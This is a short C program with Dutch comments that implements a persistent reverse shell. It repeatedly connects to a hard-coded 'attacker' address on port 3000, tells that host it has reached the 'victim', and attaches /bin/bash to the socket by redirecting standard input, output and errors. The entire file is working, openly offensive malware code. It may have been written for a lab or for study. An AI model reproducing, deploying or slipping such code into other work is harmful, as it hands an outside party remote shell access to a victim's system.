#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

 
int main(){ 

	//socket informatie, connectie informatie, proces id voor de fork() etc.
    int socket_info;
    int connectie;
    int pid;
    struct sockaddr_in aanvaller_info;


    while(1){
	//soort socket, IPv4, poort nummer, aanvallers' IP.
	socket_info = socket(AF_INET, SOCK_STREAM, 0);
    aanvaller_info.sin_family = AF_INET;
    aanvaller_info.sin_port = htons(3000);
    aanvaller_info.sin_addr.s_addr = inet_addr("192.168.0.105");
	printf("Set data.\n");
	
	printf("Probeert connectie te maken.\n");
    connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
	while(connectie < 0){
		printf("Connectie mislukt. Probeer opnieuw.\n");
		sleep(5);
		connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
    }
    connectie = write(socket_info,"Connectie gemaakt met slachtoffer.\n",36);
    
    printf("Connectie gemaakt met de aanvaller.\n");
    
    pid = fork();
    if(pid > 0){
		printf("PARENT proces; wacht tot shell proces klaar is.\n");
		wait(NULL);
	}
	if(pid == 0){
		printf("CHILD proces; input/output vanaf nu door de socket -> start de shell.\n");
		dup2(socket_info,0); // input
		dup2(socket_info,1); // output
		dup2(socket_info,2); // errors
		execl("/bin/bash", "/bin/bash", NULL);
	}
    printf("CHILD is gesloten; terug naar de while loop.\n");
    
}
	return 0;

}
